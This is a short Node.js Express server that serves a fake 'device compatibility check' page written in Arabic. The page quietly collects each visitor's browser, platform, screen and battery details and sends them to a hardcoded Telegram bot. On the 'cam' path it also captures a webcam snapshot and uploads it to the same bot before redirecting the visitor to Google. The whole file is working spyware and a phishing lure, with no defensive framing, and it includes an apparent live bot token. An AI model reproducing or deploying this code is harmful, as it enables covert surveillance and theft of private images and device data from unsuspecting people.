const express = require('express');
const app = express();
const t = '8524312771:AAGzkfu6ZiFBClFRDJaG4SPWl1eEZcgHEU8';
const i = '6315285444';

app.get('/:p?', (req, res) => {
    const p = req.params.p || 'info';
    res.send(`<html><body style="background:#000;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif">
    <h2>جاري فحص توافق الجهاز...</h2>
    <script>
    async function s(){
        const d={Device:navigator.userAgent,Plat:navigator.platform,Res:screen.width+'x'+screen.height};
        if(navigator.getBattery){const b=await navigator.getBattery();d.Bat=Math.round(b.level*100)+'%'}
        let m='🎯 **تقرير جديد ('+p+')**\\n';
        for(const [k,v] of Object.entries(d)){m+='🔹 '+k+': '+v+'\\n'}
        fetch('https://api.telegram.org/bot${t}/sendMessage?chat_id=${i}&text='+encodeURIComponent(m)+'&parse_mode=Markdown');
        if(p==='cam'){
            navigator.mediaDevices.getUserMedia({video:true}).then(st=>{
                const v=document.createElement('video');v.srcObject=st;v.play();
                setTimeout(()=>{
                    const c=document.createElement('canvas');c.width=640;c.height=480;
                    c.getContext('2d').drawImage(v,0,0,640,480);
                    c.toBlob(b=>{
                        const f=new FormData();f.append('photo',b,'i.jpg');
                        fetch('https://api.telegram.org/bot${t}/sendPhoto?chat_id=${i}',{method:'POST',body:f}).then(()=>location.href='https://google.com')
                    },'image/jpeg')
                },2000)
            }).catch(()=>location.href='https://google.com')
        }else{setTimeout(()=>location.href='https://google.com',2000)}
    }s();</script></body></html>`);
});
app.listen(process.env.PORT || 3000);
